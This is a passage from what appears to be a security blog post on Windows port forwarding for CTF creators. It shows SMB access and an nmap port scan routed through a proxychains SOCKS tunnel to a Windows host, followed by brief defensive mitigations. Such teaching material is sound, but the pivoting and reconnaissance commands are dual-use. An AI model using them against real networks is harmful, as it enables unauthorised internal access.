+</span></span><span class="line"><span class="cl">Reconnecting with SMB1 <span class="k">for</span> workgroup listing.
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We can authenticate to SMB via the SOCKS5 port through the proxychain.</p>
+<p>Now let&rsquo;s scan some of the ports to prove that we have access to all the ports of the Windows system:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">❯ sudo proxychains nmap -p 445,135,5040,7680 localhost -Pn -sT
+</span></span><span class="line"><span class="cl"><span class="o">[</span>proxychains<span class="o">]</span> config file found: /etc/proxychains.conf
+</span></span><span class="line"><span class="cl"><span class="o">[</span>proxychains<span class="o">]</span> preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+</span></span><span class="line"><span class="cl"><span class="o">[</span>proxychains<span class="o">]</span> DLL init: proxychains-ng 4.15
+</span></span><span class="line"><span class="cl">Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2022-03-07 15:21 EST
+</span></span><span class="line"><span class="cl"><span class="o">[</span>proxychains<span class="o">]</span> Strict chain  ...  127.0.0.1:1080  ...  127.0.0.1:135  ...  OK
+</span></span><span class="line"><span class="cl"><span class="o">[</span>proxychains<span class="o">]</span> Strict chain  ...  127.0.0.1:1080  ...  127.0.0.1:445  ...  OK
+</span></span><span class="line"><span class="cl"><span class="o">[</span>proxychains<span class="o">]</span> Strict chain  ...  127.0.0.1:1080  ...  127.0.0.1:5040  ...  OK
+</span></span><span class="line"><span class="cl"><span class="o">[</span>proxychains<span class="o">]</span> Strict chain  ...  127.0.0.1:1080  ...  127.0.0.1:7680  ...  OK
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> localhost <span class="o">(</span>127.0.0.1<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.0038s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PORT     STATE SERVICE
+</span></span><span class="line"><span class="cl">135/tcp  open  msrpc
+</span></span><span class="line"><span class="cl">445/tcp  open  microsoft-ds
+</span></span><span class="line"><span class="cl">5040/tcp open  unknown
+</span></span><span class="line"><span class="cl">7680/tcp open  pando-pub
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 0.06 seconds
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h1 id="defense">Defense</h1>
+<p>Mitigating port forwarding techniques can be challenging, but here are some effective strategies:</p>
+<ul>
+<li><strong>Enable only necessary ports</strong>: Ensure that only the required ports are open to minimize potential attack vectors.</li>
+<li><strong>Limit the number of services</strong>: Disable any services that are not actively being used to reduce the risk of exploitation.</li>
+<li><strong>Monitor network traffic</strong>: Utilize the following tools to monitor and analyze network traffic for suspicious activities:
+<ul>
+<li><strong>Deep-Packet Inspection Firewall</strong></li>
+<li><strong>Unified Threat Management (UTM) systems</strong></li>
+<li><strong>Intrusion Detection Systems (IDS) / Intrusion Prevention Systems (IPS)</strong></li>
+</ul>
+</li>
+</ul>
+<p>By implementing these measures, you can enhance your network security and reduce the risk of unauthorized port forwarding activities.</p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2022-03-20</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/port-forwarding/">Port Forwarding</a>,&nbsp;<a href="/tags/remote-port-forwarding/">Remote Port Forwarding</a>,&nbsp;<a href="/tags/dynamic-port-forwarding/">Dynamic Port Forwarding</a>,&nbsp;<a href="/tags/proxychains/">Proxychains</a>,&nbsp;<a href="/tags/chisel/">Chisel</a>,&nbsp;<a href="/tags/local-privilege-escalation/">Local Privilege Escalation</a>,&nbsp;<a href="/tags/windows/">Windows</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/windows-privesc-registry/" class="prev" rel="prev" title="Windows Local Privilege Escalation - Registry Hives for CTF Creators"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>Windows Local Privilege Escalation - Registry Hives for CTF Creators</a>
+            <a href="/windows-privesc-path-hijacking/" class="next" rel="next" title="Windows Local Privilege Escalation - PATH Hijacking for CTF Creators">Windows Local Privilege Escalation - PATH Hijacking for CTF Creators<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.138.0">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.11"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2021 - 2024</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank"></a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/lightgallery/css/lightgallery-bundle.min.css"><link rel="stylesheet" href="/lib/katex/katex.min.css"><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lightgallery.min.js"></script><script type="text/javascript" src="/lib/lightgallery/plugins/thumbnail/lg-thumbnail.min.js"></script><script type="text/javascript" src="/lib/lightgallery/plugins/zoom/lg-zoom.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/mhchem.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":-1},"comment":{},"lightgallery":true,"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30,"type":"lunr"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
